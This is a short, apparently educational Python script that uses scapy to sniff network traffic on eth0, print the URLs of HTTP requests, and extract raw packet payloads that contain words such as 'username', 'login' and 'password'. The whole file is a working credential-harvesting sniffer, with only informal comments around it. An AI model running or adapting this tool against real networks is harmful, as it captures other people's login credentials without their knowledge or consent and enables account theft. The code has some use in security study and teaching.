import scapy.all as scapy
from scapy.layers import http


def get_url(packet):
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return url


def get_login_info(packet):
    # using this filter from scapy
    if packet.haslayer(scapy.Raw):
        # get data we care about it
        keywords = [b"username", b"user", b"login", b"password", b"pass"]
        for keyword in keywords:
            if keyword in packet[scapy.Raw].load:
                return packet[scapy.Raw].load


def sniff(interface):
    '''
        first argument is interface you want to do sniffer on it
        second one is store in momery we say no
        thrid is callback function every time this function capture a backet
        filter if you look for udp or tcp ot arp or port (80/21/...)
    '''
    scapy.sniff(iface=interface, store=False,
                prn=process_sniffed_packet)


def process_sniffed_packet(packet):
    # using this layer because scapy do not have http layer filter
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(b"[+] HTTP Request >> "+ url)

        login_info = get_login_info(packet)
        if login_info:
            print(b"\n\n [+] Possible username/password" + login_info + b"\n\n")


sniff("eth0")
